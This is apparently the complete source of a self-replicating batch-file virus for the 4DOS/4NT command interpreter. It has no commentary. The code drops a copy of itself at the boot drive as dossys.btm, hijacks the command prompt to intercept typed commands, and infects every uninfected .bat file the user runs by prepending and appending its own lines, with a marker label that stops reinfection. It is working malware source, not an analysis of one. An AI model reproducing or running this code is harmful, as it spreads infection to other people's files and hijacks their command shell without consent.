   @goto TheHeLL
   :realprg
   @if "%@eval[666-17]"=="649" quit
   @echo @rem>exit.bat
   @exit.bat>nul
   :TheHeLL
   @if "%17" eq "666" goto realprg
   @if not "%@eval[666-17]"=="649" goto realprg
   @if %_4ver lt 5.5 goto realprg
   @if exist %_boot:\dossys.btm %_boot:\dossys %@full[%_batchname %&]
   @setlocal
   @loadbtm on
   @setdos /x-4
   @set handle=%@fileopen[%_boot:\dossys.btm,write]
   @set rpos=%@eval[%_batchline -15]
   @do $garca$ = %@eval[24 +%rpos] to %@eval[55 +%rpos]
   @set dummy=%@filewrite[%handle,%@line[%_batchname,%$garca$]]
   @enddo
   @do $garca$ = %@eval[2 +%rpos] to %@eval[23 +%rpos]
   @set dummy=%@filewrite[%handle,%@line[%_batchname,%$garca$]]
   @enddo
   @set dummy=%@fileclose[%handle]
   @setdos /x0
   @%_boot:\dossys %@full[%_batchname %&]
   @if "%17" eq "666" quit
   @setlocal
   @set 17=666
   @if "%1" ne "" call %&
   @goto back
   :execute
   @unset file handle >& nul
   @call %exe
   :back
   @setdos /x-46
   @loadbtm on
   @input %@upper[%_cwd%%@char[62]] %%exe
   @set file=%@word["/ ",0,%exe]
   @if isinternal %file .or. isalias %file .or. isdir %file goto execute
   @set file=%@search[%file]
   @if "%@word[".",1,%file]" ne "bat" goto execute
   @if "%@line[%file,0]" eq "@goto TheHeLL" goto execute
   setdos/x+6
   @echo @goto TheHeLL>%_boot:\$naphtmp.$$$
   @echo :realprg>>%_boot:\$naphtmp.$$$
   @copy %_boot:\$naphtmp.$$$+%file %_boot:\$naphtmp.$$$
   @set handle=%@fileopen[%_boot:\$naphtmp.$$$, append]
   @do $garca$ = 32 to 53
   @set dummy=%@filewrite[%handle,%@line[%_batchname,%$garca$]]
   @enddo
   @do $garca$ = 0 to 31
   @set dummy=%@filewrite[%handle,%@line[%_batchname,%$garca$]]
   @enddo
   @set dummy=%@fileclose[%handle]
   @setdos /x0
   @move %_boot:\$naphtmp.$$$ %file
   @goto execute
